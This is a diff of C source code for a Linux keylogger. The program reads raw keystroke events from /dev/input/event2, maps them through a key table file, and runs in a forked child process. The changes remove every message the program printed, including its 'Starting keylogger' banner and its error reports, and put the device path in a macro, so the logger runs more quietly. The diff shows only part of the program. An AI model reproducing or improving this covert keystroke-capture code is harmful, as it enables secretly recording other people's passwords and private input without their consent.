@@ -5,13 +5,13 @@
 #include <linux/input.h>
 #include <string.h>
 
+#define input_file "/dev/input/event2"
+
+#define debug 0
 
 char keys[242][20];
 
-
 main() {
-	printf("Starting keylogger\n");
-
 	int piped[2];
 
 	pipe(piped);
@@ -19,7 +19,6 @@ main() {
 	pid_t pid = fork();
 
 	if(pid == -1) {
-		perror("Child couldn't be created\n");
 		exit(1);
 	}
 
@@ -43,13 +42,10 @@ main() {
 			FILE *result;
 			
 			load_key_map();
-			
-			printf("Iniciando keylogger (%d)\n", getpid());
 
-			file = open("/dev/input/event2", O_RDONLY);
+			file = open(input_file, O_RDONLY);
 
 			if (file < 0) {
-				printf("Couldn't open the event file");
 				exit(1);
 			}
 
@@ -79,7 +75,6 @@ main() {
 load_key_map() {
 	FILE *kf = fopen("./etc/map.txt", "r");
 	if(kf == NULL){ 
-		printf("ERROR : keys file missing\n");
 		exit(0);
 	}
 	char line[40];
